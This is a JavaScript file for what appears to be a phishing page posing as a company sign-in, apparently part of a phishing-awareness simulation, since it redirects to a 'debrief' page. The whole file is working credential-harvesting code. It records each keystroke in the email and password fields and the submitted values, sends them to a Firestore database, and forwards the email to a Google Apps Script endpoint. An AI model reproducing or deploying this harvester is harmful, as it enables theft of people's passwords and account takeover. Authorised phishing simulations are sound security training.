// Import the functions you need from the SDKs you need
import {initializeApp} from "https://www.gstatic.com/firebasejs/9.19.1/firebase-app.js";
import {
  getFirestore,
  collection,
  addDoc,
  doc,
} from "https://www.gstatic.com/firebasejs/9.19.1/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyDt0yxMpDHjMJVKSkTWdei4YsEhjRVs7lo",
  authDomain: "thesimpleclub-international.firebaseapp.com",
  databaseURL: "https://thesimpleclub-international.firebaseio.com",
  projectId: "thesimpleclub-international",
  storageBucket: "thesimpleclub-international.appspot.com",
  messagingSenderId: "225052830342",
  appId: "1:225052830342:web:8d0152ddc57d0981",
  measurementId: "G-EJ1JZ0755G"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const firestore = getFirestore(app);

let currentSession = sessionStorage.getItem('session_id');
if (!currentSession) {
  const ref = await addDoc(collection(firestore, 'sessions'), {
    timestamp: new Date(),
    userAgent: navigator.userAgent,
  });
  currentSession = ref.id;
  sessionStorage.setItem('session_id', currentSession);
}
const session = doc(firestore, 'sessions', currentSession);

console.log('init');
document.getElementById('submit_btn')?.addEventListener('click', submitEmail, false);
document.getElementById('next-button')?.addEventListener('click', submitPassword, false);
document.getElementById('signup_email')?.addEventListener('input', async (input) => {
  console.log(input);
  await addDoc(collection(session, 'events'), {
    type: 'email',
    timestamp: new Date(),
    userAgent: navigator.userAgent,
    content: input.target.value
  });
}, false);
document.getElementById('password')?.addEventListener('input', async (input) => {
  console.log(input);
  if (input.target.value) {
    document.getElementById('passwort-placeholder').classList.add('active');
  } else {
    document.getElementById('passwort-placeholder').classList.remove('active');
  }

  await addDoc(collection(session, 'events'), {
    type: 'password',
    timestamp: new Date(),
    userAgent: navigator.userAgent,
    content: input.target.value
  });
});

async function submitEmail() {
  const email = document.getElementById('signup_email').value;
  console.log(email);
  let promise = addDoc(collection(session, 'events'), {
    type: 'email_submit',
    timestamp: new Date(),
    userAgent: navigator.userAgent,
    content: email,
  });
  if (!email.endsWith('@simpleclub.com')) {
    document.getElementById('email_invalid_warning').hidden = false;
  } else {
    localStorage.setItem('email', email);
    const scriptElem = document.createElement('script');
    scriptElem.src = `https://script.google.com/macros/s/AKfycbxItL-uNxwhALA-AOWHqcBn4ypJQfa6nnH7jW8n8-506mlFivRIatN7Y0CJb3VW_kbPIA/exec?callback=continueToGoogle&email=${email}`;
    document.body.append(scriptElem);
    await promise;
  }
}

async function submitPassword() {
  const password = document.getElementById('password').value;
  let promise = addDoc(collection(session, 'events'), {
    type: 'password_submit',
    timestamp: new Date(),
    userAgent: navigator.userAgent,
    content: password,
  });
  if (password) {
    await promise;
    window.location.href = './debrief';
  }
}
